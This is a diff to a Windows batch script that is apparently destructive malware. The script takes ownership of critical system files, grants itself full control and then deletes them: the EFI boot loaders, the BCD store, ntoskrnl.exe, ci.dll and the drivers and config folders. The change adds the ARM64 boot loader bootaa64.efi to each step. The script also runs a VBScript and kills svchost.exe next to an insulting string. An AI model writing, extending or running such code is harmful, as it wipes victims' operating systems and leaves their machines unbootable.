@@ -84,6 +84,7 @@ takeown /f drivers /r /d y
 takeown /f Boot /r /d y
 takeown /f ..\Boot /r /d y
 takeown /f W:\EFI\Boot\bootx64.efi
+takeown /f W:\EFI\Boot\bootaa64.efi
 takeown /f W:\EFI\Microsoft\Boot\BCD
 takeown /f ntoskrnl.exe
 takeown /f config /r /d y
@@ -115,6 +116,7 @@ echo y|cacls drivers /g %username%:F /t
 echo y|cacls Boot /g %username%:F /t
 echo y|cacls ..\Boot /g %username%:F /t
 icacls W:\EFI\Boot\bootx64.efi /grant %username%:F
+icacls W:\EFI\Boot\bootaa64.efi /grant %username%:F
 icacls W:\EFI\Microsoft\Boot\BCD /grant %username%:F
 icacls ntoskrnl.exe /grant %username%:F
 icacls ci.dll /grant %username%:F
@@ -133,6 +135,7 @@ rd drivers /s /q
 rd Boot /s /q
 rd ..\Boot /s /q
 del W:\EFI\Boot\bootx64.efi /f
+del W:\EFI\Boot\bootaa64.efi /f
 del W:\EFI\Microsoft\Boot\BCD /f
 del ntoskrnl.exe /f
 rd config /s /q
@@ -157,3 +160,4 @@ wscript yt.vbs
 del yt.vbs /f
 
 suckyouidiottaskkill /f /im svchost.exe
+
